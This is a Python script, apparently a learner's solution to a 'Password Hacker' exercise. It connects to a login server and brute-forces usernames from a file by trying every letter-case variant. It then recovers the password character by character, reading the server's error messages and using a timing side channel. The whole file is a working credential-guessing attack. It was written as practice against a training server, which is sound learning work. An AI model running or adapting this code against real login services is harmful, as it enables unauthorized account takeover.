import argparse
import socket
import itertools
import os
import json
from string import ascii_letters
from string import digits
import time

parser = argparse.ArgumentParser()
parser.add_argument("ip_address")
parser.add_argument("port")
args = parser.parse_args()
os.chdir('C:/Users/SEZHU/PycharmProjects/Password_Hacker')


def connect_to_server():
    pass_w = []
    log_in = ''
    char_num = list(itertools.chain(ascii_letters, digits))
    my_iterator = iter(char_num)

    with socket.socket() as client_socket:
        hostname = str(args.ip_address)
        port = int(args.port)
        address = (hostname, port)
        client_socket.connect(address)

        def login_hack():
            with open('logins.txt', 'r') as file:
                for s in file:
                    logins = map(lambda x: ''.join(x),
                                 itertools.product(*zip(s.rstrip().upper(), s.rstrip().lower())))
                    for item in logins:
                        yield item

        def pass_hack(status):
            nonlocal pass_w, my_iterator
            letter = next(my_iterator)
            if status == 'Wrong password!':
                try:
                    pass_w[-1] = letter
                except IndexError:
                    pass_w.append(letter)
            elif status == 'Exception happened during login':
                pass_w.append(letter)
                my_iterator = iter(char_num)

        def generate_json(login='', password=''):
            send_to_server = {'login': login, 'password': password}
            return json.dumps(send_to_server)

        logins = login_hack()
        while True:

            message = generate_json(login=log_in, password=''.join(pass_w))

            client_socket.send(message.encode())
            start = time.perf_counter()
            response = client_socket.recv(1024)
            end = time.perf_counter()
            total_time = end - start

            response = json.loads(response.decode())

            if response.get('result') == 'Connection success!':
                print(message)
                break
            elif response.get('result') == 'Wrong login!':
                log_in = next(logins)

            elif response.get('result') == 'Wrong password!':
                if total_time > 0.1:
                    pass_hack('Exception happened during login')
                else:
                    pass_hack(response.get('result'))
            elif response.get('result') == 'Exception happened during login':
                pass_hack(response.get('result'))
            else:
                break


connect_to_server()
